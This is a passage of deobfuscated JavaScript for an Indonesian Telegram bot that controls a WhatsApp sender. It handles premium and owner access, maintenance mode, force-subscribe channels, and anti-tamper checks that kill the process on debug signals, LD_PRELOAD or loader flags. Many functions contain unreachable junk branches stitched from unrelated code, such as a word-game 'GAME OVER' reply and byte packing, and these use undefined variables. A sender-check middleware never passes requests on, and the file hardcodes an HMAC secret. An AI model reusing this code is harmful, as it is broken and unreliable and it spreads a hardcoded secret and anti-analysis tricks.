        if (!stillAllowed) {
          emergencyShutdown(killReasons.whitelist);
          return;
        }
        botRuntime.validatedAt = now;
        validation.isBotValid = true;
      } catch (err) {
        console.log(chalk.yellow("  ⚠  Periodic validation skipped: " + err.message));
      }
    }, 60000);
    if (typeof periodicCheck.unref === "function") periodicCheck.unref();
    const integrityLoop = setInterval(() => {
      try {
        if (validation.killed) return;
        const opts = {};
        opts.skipVM = !!IS_CONTAINERIZED;
        PROTECT.runProtectChecks(opts);
        runEnvironmentChecks();
      } catch (err) {
        PROTECT.hardKill("Integrity checker crashed");
      }
    }, 3500);
    if (typeof integrityLoop.unref === "function") integrityLoop.unref();
    return true;
  } catch (err) {
    printLine();
    logFailure("VALIDATION ERROR", err.response && err.response.status ? "HTTP " + err.response.status : err.message);
    return false;
  }
}
process.on("uncaughtException", error => {
  try {
    console.log(chalk.red("  [uncaughtException]"), error && error.message ? error.message : error);
  } catch (e) {}
  try {
    console.log(error && error.stack ? error.stack : "");
  } catch (e) {}
  if (error && /protect|integrity|bypass|tamper|ak72/i.test(String(error.message || ""))) PROTECT.hardKill("Uncaught exception in security layer");
});
process.on("unhandledRejection", reason => {
  const helper = {};
  helper.label = "  [unhandledRejection]";
  const H = helper;
  try {
    console.log(chalk.red(H.label), reason);
  } catch (e) {}
});
process.on("SIGUSR1", () => {
  const helper = {};
  helper.message = "SIGUSR1 debug signal detected";
  const H = helper;
  PROTECT.hardKill(H.message);
});
const filePaths = {};
filePaths.MODE_FILE = "./Tools/mode.json";
filePaths.premiumFile = "./database/premiumuser.json";
filePaths.adminFile = "./database/adminuser.json";
filePaths.GROUP_FILE = "./Tools/groupmode.json";
filePaths.antiFotoFile = "./Tools/antifoto.json";
filePaths.safeFile = "./Tools/safeGroups.json";
filePaths.antiVideoFile = "./Tools/antivideo.json";
filePaths.premiumGroupsFile = "./Tools/premiumGroups.json";
filePaths.ownerFile = "./database/owner.json";
filePaths.sessionPath = "./session";
filePaths.forceSubFile = "./database/forcesub.json";
filePaths.maintenanceFile = "./database/maintenance.json";
const PATHS = filePaths,
  mediaAssets = {};
mediaAssets.home = "https://files.catbox.moe/l7qdi9.jpg";
const MEDIA = mediaAssets,
  HMAC_SECRET = "dark-core-secret-a7f3c9b2e1",
  botRuntime = {
    sock: null,
    isWhatsAppConnected: false,
    linkedWhatsAppNumber: "",
    isStarting: false,
    hasConnectedOnce: false,
    reconnectAttempts: 0,
    pairingMessage: null,
    antiCulik: true,
    autoReject: false,
    currentMode: "self",
    premiumUsers: [],
    adminList: [],
    ownerUsers: [],
    antiFotoGroups: [],
    antiVideoGroups: [],
    whitelistGroups: [],
    premiumGroups: [],
    COOLDOWN_TIME: 1,
    COOLDOWN_TEXT: "1d",
    cooldowns: new Map(),
    clickCooldown: new Map(),
    warnedGroups: new Map(),
    activeMenus: new Map(),
    pageCache: new Map(),
    discoIndex: 0,
    validatedAt: 0,
    validateInterval: 300000,
    botId: null
  },
  startCooldownMap = new Map(),
  START_COOLDOWN_MS = 3000;

function hmacHash(value) {
  return crypto.createHmac("sha256", HMAC_SECRET).update(String(value)).digest("hex");
}
const loadJsonFile = filePath => {
    const helper = {};
    helper.corruptLabel = "⚠️ JSON corrupt:";
    const H = helper;
    try {
      if (!fs.existsSync(filePath)) return [];
      const content = fs.readFileSync(filePath, "utf8");
      if (!content.trim()) return [];
      return JSON.parse(content);
    } catch (err) {
      console.log(H.corruptLabel, filePath);
      return [];
    }
  },
  saveJsonFile = (filePath, data) => {
    const helper = {};
    helper.subtract = function (a, b) {
      return a - b;
    };
    helper.equals = function (a, b) {
      return a === b;
    };
    helper.tag = "srSzX";
    helper.saveFailLabel = "❌ Failed save JSON:";
    const H = helper;
    try {
      const tmpPath = filePath + ".tmp";
      fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2));
      fs.renameSync(tmpPath, filePath);
    } catch (err) {
      if (H.equals(H.tag, H.tag)) console.log(H.saveFailLabel, filePath, err.message);
      else a = f.photo[H.subtract(C.photo.length, 1)].file_id;
    }
  };

function loadAllData() {
  botRuntime.ownerUsers = loadJsonFile(PATHS.ownerFile);
  botRuntime.premiumUsers = loadJsonFile(PATHS.premiumFile);
  botRuntime.adminList = loadJsonFile(PATHS.adminFile);
  botRuntime.antiFotoGroups = loadJsonFile(PATHS.antiFotoFile);
  botRuntime.antiVideoGroups = loadJsonFile(PATHS.antiVideoFile);
  botRuntime.whitelistGroups = loadJsonFile(PATHS.safeFile);
  botRuntime.premiumGroups = loadPremiumGroups();
  botRuntime.currentMode = getBotMode();
}

function getBotMode() {
  const helper = {};
  helper.antiCulikHelp = "Gunakan: /anticulik on | /anticulik off | /anticulik autoreject";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.antiCulikOn = "✅ AntiCulik ON";
  helper.autoRejectOn = "🚫 Auto Reject ON";
  helper.toolsDir = "./Tools";
  helper.defaultMode = "self";
  helper.utf8 = "utf8";
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.tag = "ienSx";
  const H = helper;
  try {
    if (!fs.existsSync(PATHS.MODE_FILE)) {
      const mkdirOpts = {};
      mkdirOpts.recursive = true;
      fs.mkdirSync(H.toolsDir, mkdirOpts);
      const modeObj = {};
      modeObj.mode = "self";
      fs.writeFileSync(PATHS.MODE_FILE, JSON.stringify(modeObj, null, 2));
      return H.defaultMode;
    }
    const parsed = JSON.parse(fs.readFileSync(PATHS.MODE_FILE, H.utf8));
    return parsed.mode || H.defaultMode;
  } catch {
    if (H.equals2(H.tag, "uxkXJ")) {
      const value = w.message.text.split(" ")[1];
      if (!value) return n.reply(H.antiCulikHelp);
      if (H.equals(value, "on")) {
        c.antiCulik = true;
        e.autoReject = false;
        v.reply(H.antiCulikOn);
      } else {
        if (H.equals(value, "off")) {
          p.antiCulik = false;
          T.reply("❌ AntiCulik OFF");
        } else if (H.equals(value, "autoreject")) {
          Z.antiCulik = true;
          r.autoReject = true;
          O.reply(H.autoRejectOn);
        }
      }
    } else return H.defaultMode;
  }
}

function saveBotMode(mode) {
  const helper = {};
  helper.self = "self";
  const H = helper;
  if (![H.self, "public"].includes(mode)) return;
  botRuntime.currentMode = mode;
  const modeObj = {};
  modeObj.mode = mode;
  fs.writeFileSync(PATHS.MODE_FILE, JSON.stringify(modeObj, null, 2));
}

function getGroupMode() {
  const helper = {};
  helper.lessOrEqual = function (a, b) {
    return a <= b;
  };
  helper.markdown = "Markdown";
  helper.connectedLabel = "[ ✓ ] WhatsApp Connected";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "xlamW";
  helper.tagB = "DCcrs";
  helper.toolsDir = "./Tools";
  helper.off = "off";
  helper.utf8 = "utf8";
  const H = helper;
  try {
    if (H.notEquals("APcTF", H.tagA)) {
      if (!fs.existsSync(PATHS.GROUP_FILE)) {
        if (H.tagB !== "DCcrs") {
          d.nyawa--;
          if (H.lessOrEqual(J.nyawa, 0)) {
            delete y[l];
            const opts = {};
            opts.parse_mode = H.markdown;
            return X.reply("💀 *GAME OVER*\n\nKatanya: " + I.kata, opts);
          }
        } else {
          const mkdirOpts = {};
          mkdirOpts.recursive = true;
          fs.mkdirSync(H.toolsDir, mkdirOpts);
          const groupObj = {};
          groupObj.group = H.off;
          fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify(groupObj, null, 2));
          return "off";
        }
      }
      const parsed = JSON.parse(fs.readFileSync(PATHS.GROUP_FILE, H.utf8));
      return parsed.group || H.off;
    } else t.log(a.green.bold(H.connectedLabel));
  } catch {
    return "off";
  }
}

function saveGroupMode(mode) {
  const helper = {};
  helper.off = "off";
  const H = helper;
  if (!["on", H.off].includes(mode)) return;
  const groupObj = {};
  groupObj.group = mode;
  fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify(groupObj, null, 2));
}

function isPremiumUser(userId) {
  return botRuntime.premiumUsers.includes(userId.toString());
}

function isOwner(userId) {
  const hashed = hmacHash(userId),
    ownerHashes = botRuntime.ownerUsers.map(id => hmacHash(id));
  const configHashes = OWNER_ID.map(id => hmacHash(id));
  return ownerHashes.includes(hashed) || configHashes.includes(hashed);
}

function withCooldown(ctx, next) {
  if (!ctx.from || !ctx.from.id) return next();
  if (isOwner(ctx.from.id)) return next();
  const userId = String(ctx.from.id);
  const now = Date.now();
  if (botRuntime.cooldowns.size > 1000)
    for (const entry of botRuntime.cooldowns.entries()) {
      if (entry[1] < now) botRuntime.cooldowns.delete(entry[0]);
    }
  const expiresAt = botRuntime.cooldowns.get(userId);
  if (expiresAt && now < expiresAt) {
    const secondsLeft = Math.ceil((expiresAt - now) / 1000);
    return ctx.reply("⏳ Cooldown aktif! Tunggu " + secondsLeft + " lagi.");
  }
  botRuntime.cooldowns.set(userId, now + 1);
  return next();
}

function isWhitelistedGroup(groupId) {
  return botRuntime.whitelistGroups.includes(groupId.toString());
}

function isPremiumGroup(groupId) {
  try {
    const groups = loadPremiumGroups();
    return groups.includes(groupId.toString());
  } catch {
    return false;
  }
}

function loadPremiumGroups() {
  const helper = {};
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.utf8 = "utf8";
  helper.tagA = "LbATQ";
  helper.tagB = "iWqgH";
  const H = helper;
  try {
    if (!fs.existsSync(PATHS.premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(PATHS.premiumGroupsFile, H.utf8) || "[]");
  } catch {
    if (H.tagA === H.tagB) {
      const requestOptions = {};
      requestOptions.timeout = 8000;
      requestOptions = d.get(J, requestOptions, response => {
        response.resume();
        if (H.notEquals(response.statusCode, 200)) return w({
          ok: false,
          reason: "raw link status " + response.statusCode
        });
        const result = {};
        result.ok = true;
        n(result);
      });
    } else return [];
  }
}

function savePremiumGroups(groups) {
  const helper = {};
  helper.envSuspicious = "env-suspicious:LD_PRELOAD";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tag = "Sydfr";
  const H = helper;
  try {
    if (H.notEquals(H.tag, H.tag)) {
      const result = {};
      result.ok = false;
      result.reason = H.envSuspicious;
      return result;
    } else fs.writeFileSync(PATHS.premiumGroupsFile, JSON.stringify(groups, null, 2));
  } catch (err) {}
}

function getMaintenanceState() {
  const helper = {};
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "ssGxW";
  helper.tagB = "seGMN";
  helper.utf8 = "utf8";
  helper.defaultJson = "{\"active\":false}";
  const H = helper;
  try {
    if (H.notEquals(H.tagA, H.tagB)) {
      const state = {};
      state.active = false;
      if (!fs.existsSync(PATHS.maintenanceFile)) return state;
      return JSON.parse(fs.readFileSync(PATHS.maintenanceFile, H.utf8) || H.defaultJson);
    } else return a.log(f.yellow("⚠️ [cekidgb] " + C.message)), null;
  } catch (err) {
    const state = {};
    state.active = false;
    return state;
  }
}

function saveMaintenanceState(state) {
  const helper = {};
  helper.greaterOrEqual = function (a, b) {
    return a >= b;
  };
  helper.bitOr = function (a, b) {
    return a | b;
  };
  helper.bitAnd = function (a, b) {
    return a & b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tagA = "rNyHE";
  helper.tagB = "mHtzQ";
  const H = helper;
  try {
    if (H.equals(H.tagA, H.tagB)) {
      const bytes = [];
      while (H.greaterOrEqual(byteValue, 128)) {
        bytes.push(H.bitOr(H.bitAnd(currentByte, 127), 128));
        shiftValue >>>= 7;
      }
      bytes.push(i);
      return k.from(bytes);
    } else {
      const mkdirOpts = {};
      mkdirOpts.recursive = true;
      fs.mkdirSync(path.dirname(PATHS.maintenanceFile), mkdirOpts);
      fs.writeFileSync(PATHS.maintenanceFile, JSON.stringify(state, null, 2));
    }
  } catch (err) {}
}
async function syncMaintenanceToGithub(state) {
  return true;
}
async function noopAsync() {
  return;
}

function formatDurationMs(durationMs) {
  const helper = {};
  helper.divide = function (a, b) {
    return a / b;
  };
  helper.modulo = function (a, b) {
    return a % b;
  };
  helper.modulo2 = function (a, b) {
    return a % b;
  };
  helper.hourSuffix = " Jam";
  helper.add = function (a, b) {
    return a + b;
  };
  helper.minuteSuffix = " Menit";
  helper.secondSuffix = " Detik";
  const H = helper,
    totalSeconds = Math.floor(durationMs / 1000),
    hours = Math.floor(H.divide(totalSeconds, 3600));
  const minutes = Math.floor(H.divide(H.modulo(totalSeconds, 3600), 60)),
    seconds = Math.floor(H.modulo2(totalSeconds, 60));
  return [hours ? hours + H.hourSuffix : "", minutes ? H.add(minutes, H.minuteSuffix) : "", seconds + H.secondSuffix].filter(Boolean).join(" ");
}

function isOwnerCheck(userId) {
  return isOwner(userId);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function clearSessionFolder() {
  try {
    if (fs.existsSync(PATHS.sessionPath)) {
      const rmOpts = {};
      rmOpts.recursive = true;
      rmOpts.force = true;
      fs.rmSync(PATHS.sessionPath, rmOpts);
      console.log(chalk.hex("#ffb86c")("!") + chalk.white("Session di hapus"));
    }
  } catch (err) {
    console.log(chalk.hex("#ff5555")("✗") + chalk.white("Gagal menghapus session"));
  }
}

function formatUptime(secondsInput) {
  const totalSeconds = Number(secondsInput);
  const days = Math.floor(totalSeconds / 86400);
  const hours = Math.floor(totalSeconds % 86400 / 3600);
  const minutes = Math.floor(totalSeconds % 3600 / 60),
    seconds = Math.floor(totalSeconds % 60);
  return [days ? days + "d" : "", hours ? hours + "h" : "", minutes ? minutes + "m" : "", seconds + "s"].filter(Boolean).join(" ");
}

function getConnectionStatusText() {
  try {
    return "❌ NOT CONNECT";
  } catch {
    return "ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ";
  }
}

function detectEnvAnomaly() {
  try {
    const execArgs = process.execArgv || [];
    for (const arg of execArgs) {
      if (/--experimental-loader|--loader/.test(arg)) {
        const result = {};
        result.ok = false;
        result.reason = "execArgv-suspicious:" + arg;
        return result;
      }
    }
    if (process.env.LD_PRELOAD && /\.so|\.dll/.test(process.env.LD_PRELOAD)) {
      const result = {};
      result.ok = false;
      result.reason = "env-suspicious:LD_PRELOAD";
      return result;
    }
    const okResult = {};
    okResult.ok = true;
    return okResult;
  } catch (err) {
    const okResult = {};
    okResult.ok = true;
    return okResult;
  }
}

function scanSuspiciousFiles() {
  const helper = {};
  helper.tag = "KiyQp";
  const H = helper;
  try {
    const extraFiles = PROTECT.detectExtraFiles(),
      subDirFiles = PROTECT.scanSubdirsForSuspicious();
    return extraFiles.concat(subDirFiles);
  } catch (err) {
    if (H.tag === H.tag) return [];
    else a.log(f.yellow("⚠️ [xdly] " + C.message));
  }
}

function detectAnomalousPanelLog() {
  const helper = {};
  helper.divide = function (a, b) {
    return a / b;
  };
  helper.listFailMsg = "Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.tagA = "meURa";
  helper.tagB = "FuQwg";
  helper.add = function (a, b) {
    return a + b;
  };
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.emptyBrackets = "[ ]";
  helper.tagC = "qbuaP";
  helper.lessThan2 = function (a, b) {
    return a < b;
  };
  helper.greaterOrEqual = function (a, b) {
    return a >= b;
  };
  const H = helper;
  try {
    const panelLogPath = path.join(__dirname, ".ak72.panel.log");
    if (!fs.existsSync(panelLogPath)) return false;
    const content = fs.readFileSync(panelLogPath, "utf8").slice(-10000),
      lines = content.split("\n").filter(Boolean);
    if (H.lessThan(lines.length, 5)) return false;
    let emptyBracketCount = 0,
      bracketDiffTotal = 0;
    for (const line of lines.slice(-50)) {
      if (H.tagA !== H.tagB) {
        const openCount = (line.match(/\[/g) || []).length,
          closeCount = (line.match(/\]/g) || []).length;
        bracketDiffTotal += H.add(openCount, closeCount);
        if (openCount > 0 && H.greaterThan(closeCount, 0)) {
          const bracketGroups = line.match(/\[([^\]]*)\]/g) || [];
          for (const group of bracketGroups) {
            if (H.equals(group.trim(), "[]") || H.equals(group.trim(), H.emptyBrackets) || H.equals(group.trim(), "[  ]")) {
              if (H.tagC === H.tagC) emptyBracketCount++;
              else {
                const filled = Math.round(H.divide(progressValue, 10)),
                  empty = 10 - filled;
                return "▓".repeat(filled) + "░".repeat(empty);
              }
            }
          }
        }
      } else P.reply(H.listFailMsg);
    }
    if (H.lessThan2(bracketDiffTotal, 10)) return false;
    const ratio = H.divide(emptyBracketCount, Math.max(H.divide(bracketDiffTotal, 2), 1));
    if (H.greaterOrEqual(emptyBracketCount, 5) && ratio > 0.3) return true;
    return false;
  } catch (err) {
    return false;
  }
}

function triggerAutoReject(reason) {
  const helper = {};
  helper.rejectHeader = " AUTO-REJECT TRIGGERED ";
  helper.reasonPrefix = "Reason: ";
  helper.shutdownMsg = "Bot dimatikan untuk keamanan.";
  helper.securityLog = ".ak72.security.log";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.type = "AUTO_REJECT";
  const H = helper;
  console.log("");
  console.log(chalk.bgRed.white.bold(H.rejectHeader));
  console.log(chalk.redBright(H.reasonPrefix + reason));
  console.log(chalk.gray(H.shutdownMsg));
  console.log("");
  try {
    fs.appendFileSync(path.join(__dirname, H.securityLog), H.concat(JSON.stringify({
      ts: new Date().toISOString(),
      type: H.type,
      reason: reason
    }), "\n"));
  } catch (err) {}
  PROTECT.hardKill(reason);
}
const bot = new Telegraf(configuredBotToken);
bot.use(telegrafSession());
const requireConnectedSender = async (ctx, next) => {
    const richMessage = new RichHTMLBuilder()
      .heading(2, "❌ SENDER TIDAK TERHUBUNG")
      .divider()
      .paragraph("<blockquote>Sistem mendeteksi bahwa sender belum terhubung ke perangkat WhatsApp.</blockquote>")
      .table([
        ["KETERANGAN", "STATUS"],
        ["Koneksi", "Offline"],
        ["Socket", "Tidak Aktif"],
        ["Akses", "Ditolak"]
      ], {
        bordered: true,
        striped: true,
        hasHeader: true
      })
      .divider()
      .paragraph("<b>Solusi:</b>")
      .paragraph("Silahkan hubungkan ulang sender menggunakan command <code>/addbot</code> terlebih dahulu.")
      .divider()
      .build();
    return ctx.sendRichMessage(richMessage).catch(() => {
      return ctx.reply("❌ Sender tidak terhubung. Ketik /addbot terlebih dahulu.").catch(() => {});
    });
    return next();
  },
  ownerOnly = (ctx, next) => {
    if (!isOwner(ctx.from.id)) return ctx.reply("Anda Tidak Punya Akses Untuk Melakukan Ini");
    return next();
  },
  adminOnly = (ctx, next) => {
    const userId = ctx.from.id.toString();
    if (!botRuntime.adminList.includes(userId) && !botRuntime.ownerUsers.includes(userId)) {
      return ctx.reply("❌ ☇ Akses hanya untuk akses admin");
    }
    return next();
  },
  developerOnly = (ctx, next) => {
    if (!isOwner(ctx.from.id)) {
      return ctx.reply("Akses khusus Developer / Owner.");
    }
    return next();
  },
  startWhatsAppConnection = async () => {
    botRuntime.isStarting = true;
    try {
      if (!baileysDefault) await loadBaileys();
      logStatusRow("info", "Loading session", PATHS.sessionPath);
      const authState = await baileysUseMultiFileAuthState(PATHS.sessionPath),
        state = authState.state,
        saveCreds = authState.saveCreds,
        versionInfo = await baileysFetchLatestVersion(),
        version = versionInfo.version;
      botRuntime.sock = baileysDefault({
        version: version,
        auth: state,
        logger: pino({
          level: "silent"
        }),
        printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "120.0.0.0"],
        keepAliveIntervalMs: 25000,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        emitOwnEvents: true,
        fireInitQueries: true
      });
      botRuntime.sock.ev.on("creds.update", saveCreds);
      botRuntime.sock.ev.on("connection.update", async update => {
        const connection = update.connection,
          lastDisconnect = update.lastDisconnect,
          statusCode = lastDisconnect && lastDisconnect.error && lastDisconnect.error.output ? lastDisconnect.error.output.statusCode : null;
        if (connection === "connecting") {
          logStatusRow("info", "Connecting", "WhatsApp...");
        }
        if (connection === "open") {
          botRuntime.isWhatsAppConnected = true;
          botRuntime.isStarting = false;
          botRuntime.hasConnectedOnce = true;
          botRuntime.reconnectAttempts = 0;
          botRuntime.linkedWhatsAppNumber = botRuntime.sock.user && botRuntime.sock.user.id ? botRuntime.sock.user.id.split(":")[0] : "";
          botRuntime.validatedAt = Date.now();
          console.log("");
          printLine();
          console.log(chalk.hex("#50fa7b").bold("  ╔══════════════════════════════════════╗"));
          console.log(chalk.hex("#50fa7b").bold("  ║      WHATSAPP CONNECTED  ✓           ║"));
          console.log(chalk.hex("#50fa7b").bold("  ╚══════════════════════════════════════╝"));
          logStatusRow("info", "Sender", "Unknown");
          logStatusRow("ok", "Status", "Online");
          printLine();
          console.log("");
        }
        if (connection === "close") {
          botRuntime.isWhatsAppConnected = false;
          botRuntime.isStarting = false;
          logFailure("Connection closed", statusCode ? "Code: " + statusCode : "Unknown");
          if (statusCode === baileysDisconnectReason.loggedOut || statusCode === 401) {
            const flow = "3|2|0|1|4".split("|");
            let step = 0;
            while (true) {
              switch (flow[step++]) {
                case "0":
                  botRuntime.pairingMessage = null;
                  continue;
                case "1":
                  botRuntime.sock = null;
                  continue;
                case "2":
                  clearSessionFolder();
                  continue;
                case "3":
                  logStatusRow("warn", "Session", "Invalid, deleting...");
                  continue;
                case "4":
                  return;
              }
              break;
            }
          }
          const backoffMs = Math.min(1000 * Math.pow(2, 0), 30000);
          botRuntime.reconnectAttempts++;
          logStatusRow("info", "Reconnecting", "in " + backoffMs + "ms (attempt " + 0 + ")");
          setTimeout(() => {
            startWhatsAppConnection().catch(() => {
              botRuntime.isStarting = false;
            });
          }, backoffMs);
        }
      });
    } catch (err) {
      logFailure("Session error", err.message);
      botRuntime.isStarting = false;
      setTimeout(() => {
        startWhatsAppConnection().catch(() => {
          botRuntime.isStarting = false;
        });
      }, 3000);
    }
  },
  premiumOnly = (ctx, next) => {
    const userId = ctx.from.id.toString();
    if (botRuntime.premiumUsers.includes(userId)) return next();
    if (isOwner(ctx.from.id)) return next();
    if (ctx.chat && ctx.chat.type !== "private") {
      const groups = loadPremiumGroups();
      if (groups.includes(ctx.chat.id.toString())) return next();
    }
    return ctx.reply("╭━━━〔  PREMIUM ONLY ACCESS 〕━━━⬣\n❌ Akses ditolak!\n⛔ Fitur ini hanya dapat digunakan oleh user Premium.\n┌─ 🪧 Cara Mendapatkan Premium 🪧\n├ ⌨ /addprem\n│   ↳ Khusus Owner Command\n├ ⌨ /getprem\n│   ↳ Khusus Semua Tanpa Owner Command\n╰──────────────⬣\nUnlock semua fitur premium GXION.");
  },
  premiumGroupGuard = async (ctx, next) => {
    const text = ctx.message?.["text"] || "";
    if (!text.startsWith("/")) return next();
    if (ctx.chat.type === "private") return next();
    const groups = loadPremiumGroups();
    if (groups.includes(ctx.chat.id.toString())) return next();
    const command = text.split(" ")[0].split("@")[0].toLowerCase();
    const allowedCommands = ["/autopremgroup", "/listgroup"];
    if (allowedCommands.includes(command)) return next();
    const now = Date.now();
    const lastWarned = botRuntime.warnedGroups.get(ctx.chat.id) || 0;
    if (now - lastWarned > 30000) {
      botRuntime.warnedGroups.set(ctx.chat.id, now);
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, "GROUP ACCESS")
        .heading(2, "AKSES GROUP DITOLAK")
        .divider()
        .paragraph("Group ini tidak memiliki akses premium.")
        .paragraph("Gunakan /autopremgroup untuk mendapatkan akses premium.")
        .build();
      await ctx.sendRichMessage(richMessage);
    }
    return;
  };
bot.use(premiumGroupGuard);
bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();
    await noopAsync();
    const maintenance = getMaintenanceState();
    if (!maintenance.active) return next();
    if (isOwnerCheck(ctx.from.id)) return next();
    if (String(ctx.from.id) === String(maintenance.setBy)) return next();
    if (ctx.callbackQuery) {
      const alert = {};
      alert.show_alert = true;
      await ctx.answerCbQuery("🔧 SCRIPT SEDANG MAINTENANCE", alert).catch(() => {});
      return;
    }
    const startAt = maintenance.setAt || Date.now(),
      formattedStart = new Date(startAt).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      }),
      elapsed = formatDurationMs(Date.now() - startAt);
    try {
      const tableOpts = {};
      tableOpts.bordered = true;
      tableOpts.striped = true;
      tableOpts.hasHeader = true;
      const richMessage = new RichHTMLBuilder()
        .heading(2, "🔧 SCRIPT SEDANG MAINTENANCE")
        .divider()
        .paragraph("<blockquote>" + (maintenance.message || "Mohon tunggu, kami sedang melakukan maintenance.") + "</blockquote>")
        .divider()
        .table([
          ["INFO", "DETAIL"],
          ["Status", "🔴 MAINTENANCE"],
          ["Sejak", formattedStart],
          ["Durasi", elapsed],
          ["ETA", "Segera kembali normal"]
        ], tableOpts)
        .divider()
        .paragraph("<i>⚠️ Fitur bot tidak bisa diakses sementara.</i>")
        .paragraph("<i>Ketik /start lagi nanti.</i>")
        .build();
      await ctx.sendRichMessage(richMessage);
    } catch (err) {
      const opts = {};
      opts.parse_mode = "HTML";
      await ctx.reply("🔧 <b>SCRIPT SEDANG MAINTENANCE</b>\n\n" + (maintenance.message || "Mohon tunggu, kami sedang melakukan maintenance.") + "\n\n📅 Sejak: <b>" + formattedStart + "</b>\n⏱️ Durasi: <b>" + elapsed + "</b>\n\n<i>⚠️ Fitur bot tidak bisa diakses sementara.</i>", opts);
    }
    return;
  } catch (err) {
    return next();
  }
});
bot.use((ctx, next) => {
  const groupMode = getGroupMode();
  if (groupMode === "on" && ctx.chat.type === "private") return ctx.reply("Gagal membuka menu\nReason : BOT TELAH DI AKTIFKAN MODE GROUP");
  return next();
});
bot.use((ctx, next) => {
  const currentMode = getBotMode();
  if (currentMode === "self" && !isOwner(ctx.from.id)) {
    if (ctx.callbackQuery) {
      const alert = {};
      alert.show_alert = true;
      return ctx.answerCbQuery("Bot telah di kunci oleh Owner", alert);
    }
    return;
  }
  return next();
});
const forceSubSessions = new Map(),
  customChannelSessions = new Map();
bot.command("setch1", ownerOnly, async ctx => {
  const session = {};
  session.mode = 1;
  session.step = 1;
  session.channels = [];
  forceSubSessions.set(ctx.from.id, session);
  setTimeout(() => forceSubSessions.delete(ctx.from.id), 120000);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "SET FORCE SUB")
    .heading(2, "FORCE SUBSCRIBE SETUP")
    .divider()
    .paragraph("Kirim username channel pertama")
    .paragraph("<b>Contoh:</b> @channelanda")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("setch2", ownerOnly, async ctx => {
  const session = {};
  session.mode = 2;
  session.step = 1;
  session.channels = [];
  forceSubSessions.set(ctx.from.id, session);
  setTimeout(() => forceSubSessions.delete(ctx.from.id), 120000);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "SET FORCE SUB")
    .heading(2, "FORCE SUBSCRIBE SETUP")
    .divider()
    .paragraph("Kirim username channel pertama")
    .paragraph("<b>1:</b>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("customchannel", ownerOnly, async ctx => {
  customChannelSessions.delete(ctx.from.id);
  const session = {};
  session.step = 1;
  session.channels = [];
  customChannelSessions.set(ctx.from.id, session);
  setTimeout(() => customChannelSessions.delete(ctx.from.id), 300000);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "CUSTOM FORCE SUB")
    .heading(2, "CUSTOM FORCE SUBSCRIBE SETUP")
    .divider()
    .paragraph("Masukkan jumlah channel yang ingin di-set (1-10):")
    .paragraph("<b>Contoh:</b> 5")
    .divider()
    .paragraph("Syarat: Bot harus menjadi admin di semua channel")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.on("text", async (ctx, next) => {
  const forceSubSession = forceSubSessions.get(ctx.from.id);
  const customSession = customChannelSessions.get(ctx.from.id);
  if (!forceSubSession && !customSession) return next();
  const input = ctx.message.text.trim();
  if (input.startsWith("/")) return next();
  if (customSession) {
    if (customSession.step === 1) {
      const count = parseInt(input);
      if (isNaN(count) || count < 1 || count > 10) return ctx.reply("Jumlah channel harus berupa angka 1-10");
      customSession.count = count;
      customSession.step = 2;
      customChannelSessions.set(ctx.from.id, customSession);
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, "FORCE SUB")
        .heading(2, "Masukkan channel ke-1 dari " + count)
        .divider()
        .paragraph("<b>Contoh:</b> @channelanda")
        .build();
      return ctx.sendRichMessage(richMessage);
    }
    if (customSession.step === 2) {
      if (!input.startsWith("@")) return ctx.reply("Username channel harus diawali @");
      try {
        const botInfo = await ctx.telegram.getMe(),
          memberInfo = await ctx.telegram.getChatMember(input, botInfo.id);
        if (!["administrator", "creator"].includes(memberInfo.status)) return ctx.reply("Bot belum menjadi admin di " + input);
      } catch {
        return ctx.reply("Channel " + input + " tidak ditemukan atau bot belum admin");
      }
      customSession.channels.push(input);
      if (customSession.channels.length === customSession.count) {
        const saveObj = {};
        saveObj.channels = customSession.channels;
        saveJsonFile(PATHS.forceSubFile, saveObj);
        customChannelSessions.delete(ctx.from.id);
        const rows = [
          ["NO", "CHANNEL"]
        ];
        customSession.channels.forEach((channel, index) => rows.push([String(index + 1), "<code>" + channel + "</code>"]));
        const tableOpts = {};
        tableOpts.bordered = true;
        tableOpts.striped = true;
        tableOpts.hasHeader = true;
        const richMessage = new RichHTMLBuilder()
          .photo(MEDIA.home, "FORCE SUB SET")
          .heading(2, "FORCE SUBSCRIBE AKTIF")
          .divider()
          .table(rows, tableOpts)
          .build();
        return ctx.sendRichMessage(richMessage);
      } else {
        const nextIndex = customSession.channels.length + 1,
          richMessage = new RichHTMLBuilder()
            .photo(MEDIA.home, "FORCE SUB")
            .heading(2, "Masukkan channel ke-" + nextIndex + " dari " + customSession.count)
            .build();
        return ctx.sendRichMessage(richMessage);
      }
    }
  }
  if (forceSubSession) {
    if (!input.startsWith("@")) return ctx.reply("Username channel harus diawali @");
    try {
